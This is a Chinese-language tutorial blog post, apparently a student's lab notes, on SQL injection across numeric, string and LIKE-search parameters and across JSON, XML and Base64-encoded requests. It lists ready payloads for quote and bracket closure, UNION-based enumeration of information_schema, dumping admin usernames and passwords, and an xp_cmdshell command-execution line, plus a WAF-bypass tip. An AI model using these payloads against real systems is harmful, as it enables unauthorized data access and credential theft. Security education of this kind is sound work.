---
title: SQL注入&数据格式&参数类型&JSON&XML&编码加密&符号闭合
published: 2026-04-18 19:00:00
description: 参数类型（数字/字符/搜索）、数据格式（JSON/XML/Base64），符号闭合与通配符绕过，通过实战案例了解SQL注入在不同传输格式下的利用。
tags: [Web攻防,SQL注入]
category: 网络安全
draft: false
---

# 知识点

1. Web攻防-SQL注入-参数类型*参数格式
2. Web攻防-SQL注入-XML&JSON&BASE64等
3. Web攻防-SQL注入-数字字符搜索等符号绕过

# 案例说明

在应用中，存在参数值为数字，字符时，符号的介入，另外搜索功能通配符的再次介入，另外传输数据可由最基本的对应赋值传递改为更加智能的XML或JSON格式传递，部分保证更安全的情况还会采用编码或加密形式传递数据，给于安全测试过程中更大的挑战和难度。

# 参数类型&符号干扰

需要考虑闭合问题

## 常见闭合方式

```bash
-- ========== 1. 常见闭合方式 ==========

-- 单引号闭合
admin' -- 
admin' AND '1'='1
admin' UNION SELECT 1,2,3 -- 

-- 双引号闭合
admin" -- 
admin" AND "1"="1

-- 数字型（无引号）
1 AND 1=1
1 UNION SELECT 1,2,3
1 OR 1=1

-- 括号闭合
1) AND 1=1 -- 
1) UNION SELECT 1,2,3 -- 

-- 双层括号
1)) AND 1=1 -- 

-- 模糊查询闭合
-- 方式1：闭合前面的%和引号，注释后面
%' AND 1=1 -- 

-- 拼接后
SELECT * FROM products WHERE name LIKE '%' AND 1=1 -- %'

-- 方式2：闭合后构造永真
%' OR '1'='1' -- 

-- 拼接后
SELECT * FROM products WHERE name LIKE '%' OR '1'='1' -- %'

-- 方式3：UNION注入
%' UNION SELECT 1,2,3 -- 

-- 方式4：报错注入
%' AND extractvalue(1,concat(0x7e,database())) -- 


-- ========== 2. 不同数据库闭合 ==========

-- MySQL
1' AND '1'='1
1" AND "1"="1

-- MSSQL
1' AND '1'='1' --
1'; EXEC xp_cmdshell('dir') --

-- Oracle
1' AND '1'='1' --
1' || '1'='1

-- ========== 2-1. 不同数据库的通配符 ==========

MySQL	% _	%' AND 1=1 --
MSSQL	% _ []	%' AND 1=1 --
Oracle	% _	%' AND 1=1 --


-- ========== 3. 注释符号 ==========

-- MySQL：--(空格) 或 #
-- MSSQL：--
-- Oracle：--
-- PostgreSQL：--


-- ========== 4. 完整利用流程示例 ==========

-- 判断闭合
1' AND '1'='1   -- 正常
1' AND '1'='2   -- 报错

-- 查列数
1' ORDER BY 5 --  # 报错
1' ORDER BY 3 --  # 正常

-- 联合查询
-1' UNION SELECT 1,2,3 -- 

-- 查数据库名
-1' UNION SELECT 1,database(),3 -- 

-- 查表名
-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- 

-- 查列名
-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' -- 

-- 查数据
-1' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users -- 
```

## 数字

```
select * from news where id=$id;
```

## 字符

```
select * from news where name='$name';
```

## 搜索

```
select * from news where name like '%name%';
符号干扰：有无单引号或双引号及通配符等
```

符号干扰：有无单引号或双引号及通配符等

```
%' order by 3#
```

![image-20260418155947336](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418155947336.png)

```
%' union select 1,2,3#
```

![image-20260418155958833](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418155958833.png)

![image-20260418160007766](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418160007766.png)

知道数据库名：news_db

获取数据库名下的表名信息：

借助自带的information_schema.tables表（记录所有数据库名下的表名）

```
1%' union select 1,2,table_name from information_schema.tables where table_schema='news_db'#
```

admin表中的列名

借助自带的information_schema.columns表（记录所有数据库名下的表名对应的列名信息）

```
1%' union select 1,2,column_name from information_schema.columns where table_schema='news_db' and table_name='admin'#
```

数据库：

```
news_db

​	admin

​		username,password
```

```
1%' union select 1,username,password from admin#
```

 ![image-20260418161858901](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418161858901.png)

# 参数格式&编码

```
1、数据传输采用XML或JSON格式传递
2、数据传输采用编码或加密形式传递
3、数据传递采用JSON又采用编码传递
```

## XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<news>
    <article>
        <id>1</id>
        <title>xiaodi</title>
        <content>i am xiaodi</content>
        <created_at>2025-03-07</created_at>
    </article>
    <article>
        <id>2</id>
        <title>xiaodisec</title>
        <content>i am xiaodisec</content>
        <created_at>2025-03-06</created_at>
    </article>
</news>
```

![image-20260418163254020](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418163254020.png)

![image-20260418163524384](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418163524384.png)

## JSON

```json
{
    "news:"[
        {
            "id": 1,
            "title": "xiaodi",
            "content": "i am xiaodi",
            "created_at": "2025-03-07"
        },
        {
            "id": 2,
            "title": "xiaodisec",
            "content": "i am xiaodisec",
            "created_at": "2025-03-06"
        }
    ]
}
```

```sql
-- 1. 查数据库名
1%' union select 1,2,database() #

// 期间查了半天不知道还以为是语句的问题，结果看完视频才发现不能放到第2列
// 问ai说是：UNION注入时，不同回显列对数据长度/类型的支持可能不同。短字符串（如 database()）所有列都能显示，但长字符串（如 group_concat 合并的表名）可能只有特定列能显示。
-- 2. 查所有表名
1%' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='phpdemo' #

-- 3. 查 admin 表的列名
1%' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='admin' and table_schema='phpdemo' #

-- 4. 查账号密码
1%' union select 1,group_concat(username,0x3a,password),3 from admin #
或者
1%' union select 1,username,password from admin #
```

![](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418163904503.png)

![](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418163952383.png)

![image-20260418183511681](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418183511681.png)

![image-20260418183620555](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418183620555.png)

![image-20260418183733112](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418183733112.png)

### 问题

如果遇到waf需要绕过，在抓包时，可以把数据类型以及具体数据从json格式改为xml或者其他。

json格式：

![image-20260418172247444](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418172247444.png)

xml格式：

![image-20260418172550379](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418172550379.png)

## Base64

```
{
    "news": [
        {
            "id": "MQ==",
            "title": "eGlhb2Rp",
            "content": "aSBhbSB4aWFvZGk=",
            "created_at": "MjAyNS0wMy0wNw=="
        },
        {
            "id": "Mg==",
            "title": "eGlhb2Rpc2Vj",
            "content": "aSBhbSB4aWFvZGlzZWM=",
            "created_at": "MjAyNS0wMy0wNg=="
        }
    ]
}
```

![image-20260418173500356](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418173500356.png)

 ![image-20260418173455644](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418173455644.png)

# 实例应用

1. JSON注入案例：

   SRC报告-众测下的SQL注入挖掘->通过app抓到了Web数据包->跑sqlmap发现最后一个参数存在注入点

   SRC报告-edu-SQL注入案例分享->burp+proxifier抓包小程序->小程序打开后自动抓取到了两个数据包，发现关键参数api->IDOR（越权漏洞）+ API 遍历->发现api值后面加单引号会引发报错->又一个注入点

   SRC报告-河南省xxxx某站存在SQL注入漏洞->同样也是json格式的数据存在注入点，但这是在网站的用户中心挖到的，所以有时候该注册的就可以注册试一下，万一有洞呢？

2. 编码注入案例：

   互联网搜下对应说明

   https://mp.weixin.qq.com/s/Xf08xaV-YcZsQopE19pPEQ

   路由传参导致的注入漏洞